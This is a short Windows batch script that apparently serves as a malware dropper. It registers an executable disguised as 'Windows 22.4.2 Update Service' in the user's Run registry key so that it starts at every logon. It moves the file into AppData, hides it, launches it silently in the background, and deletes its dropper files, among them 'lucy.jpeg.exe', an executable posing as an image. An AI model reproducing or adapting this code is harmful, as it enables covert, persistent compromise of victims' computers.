@echo off
set "scriptdir=%~dp0"
set "uname=%USERNAME%"
set "locdir=C:\Users\%uname%\AppData\Local"
set "screx=%scriptdir%\Windows 22.4.2 Update Service.exe"
set "exe_path=%locdir%\Windows 22.4.2 Update Service.exe"
set "key_name=Windows 22.4.2 Update Service"
set "key_path=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
reg add "%key_path%" /v "%key_name%" /t REG_SZ /d "\"%exe_path%\" /background" /f


move "%screx%" "%locdir%" >nul 2>&1
aattrib +h "%exe_path%"
del "%scriptdir%\lucy.jpeg.exe"
del "%scriptdir%\Windows 22.4.2 Update Service.exe"
start /min /b "Windows 22.4.2 Update Service" "%locdir%\Windows 22.4.2 Update Service.exe" >nul 2>&1
del "%scriptdir%\driver.vbs"
del "%scriptdir%\test123.bat"